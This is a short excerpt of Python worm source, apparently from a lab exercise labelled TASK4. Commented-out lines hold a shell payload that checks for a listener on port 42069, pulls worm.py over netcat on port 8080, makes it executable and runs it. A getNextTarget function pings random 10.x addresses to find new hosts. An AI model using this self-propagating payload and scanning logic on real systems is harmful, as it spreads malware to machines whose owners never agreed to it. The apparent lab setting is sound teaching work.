...
#    " chmod +x worm.py; ./worm.py;                              *"
   #TASK4
   #" echo '(^_^) Bello (^_^)';(ss -tulpn|grep -q 42069)||       "
   #" ((test -f worm.py||nc -lnv 8080>worm.py);chmod +x worm.py; "
   #" ./worm.py;)                                               *"
...
def getNextTarget():
    ...
    #     x = randint(151,155)
    #     y = randint(70,80)
    #     targetIP = '10.'+ str(x) + '.0.' + str(y)
    #     try:
    #         output = subprocess.check_output(f"ping -q -c1 -W1 {targetIP}", shell=True,stderr=subprocess.STDOUT)
